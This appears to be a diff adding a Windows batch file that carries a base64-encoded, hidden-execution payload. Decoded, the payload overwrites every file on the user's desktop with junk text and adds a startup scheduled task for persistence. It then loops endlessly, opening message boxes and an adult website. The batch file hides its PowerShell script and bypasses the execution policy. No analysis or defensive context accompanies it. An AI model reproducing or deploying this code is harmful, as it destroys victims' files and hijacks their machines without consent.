@@ -1,0 +1,19 @@
+
+@echo off
+echo powershell.exe -ExecutionPolicy Bypass -File "%~dp0Testo1.bat" > script.ps1
+echo $Base64 = "Y21kIC9jIHBvd2Vyc2hlbGwgLU5vcCAtTm9uSSAtTm9sb2dvIC1XaW5kb3dTdHlsZSBIaWRkZW4gIldyaXRlLUhvc3QiDQpAZWNobyBvZmYgDQpmb3IgJSVBIGluICgiJVVTRVJQUk9GSUxFJVxEZXNrdG9wXCoiKSBkbyAoDQogICAgcmVuICIlJUEiICIlJX5uQS50eHQiDQogICAgZWNobyBGVUNLRVIgPiAiJVVTRVJQUk9GSUxFJVxEZXNrdG9wXCUlfm5BLnR4dCINCikNCnNjaHRhc2tzIC9jcmVhdGUgL3RuICJNeVRhc2siIC90ciAiJTAiIC9zYyBPTlNUQVJUDQo6bG9vcCANCmVjaG8gbXNnYm94ICJCYWxscyIgPiAldGVtcCVcdG1wLnZicw0Kc3RhcnQgJXRlbXAlXHRtcC52YnMNCmV4cGxvcmVyICJodHRwczovL3d3dy5wb3JuaHViLmNvbSINCmdvdG8gbG9vcA0K" >> script.ps1
+echo $DecodedBytes = [System.Convert]::FromBase64String($Base64) >> script.ps1
+echo $DecodedString = [System.Text.Encoding]::UTF8.GetString($DecodedBytes) >> script.ps1
+
+
+echo $TempFile = [System.IO.Path]::GetTempFileName() + ".bat" >> script.ps1
+echo [System.IO.File]::WriteAllText($TempFile, $DecodedString) >> script.ps1
+
+
+echo cmd /c $TempFile >> script.ps1
+
+
+echo Remove-Item $TempFile >> script.ps1
+attrib +s +h script.ps1
+
+powershell -ExecutionPolicy Bypass -File "script.ps1"
